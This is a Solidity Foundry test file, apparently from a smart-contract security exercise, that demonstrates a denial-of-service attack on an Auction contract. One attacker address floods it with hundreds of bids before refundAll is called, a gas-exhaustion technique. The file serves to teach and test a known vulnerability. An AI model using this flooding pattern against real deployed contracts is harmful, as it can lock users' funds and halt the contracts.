// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import {Test} from "forge-std/Test.sol";
import {Auction} from "../../src/DenialOfService/Auction.sol";

contract AuctionTest is Test {
    Auction public auction;

    function setUp() public {
        auction = new Auction();
    }

    function sendValue(address recipient, uint256 amount) private {
        (bool success,) = payable(recipient).call{value: amount}("");
        assertTrue(success);
    }

    function test_Attack() public {
        uint256 startingAmount = 0;
        uint256 contractAmount = 0;
        address attacker = address(1);

        uint256 maxBids = 500;

        for (uint160 i = 1; i < maxBids; i++) {
            uint256 newAmount = startingAmount + i;
            hoax(attacker, newAmount);
            auction.bid{value: newAmount}();
            contractAmount += newAmount;
        }

        assertEq(address(auction).balance, contractAmount);
        auction.refundAll();
    }

    /* OTHER TESTS */
}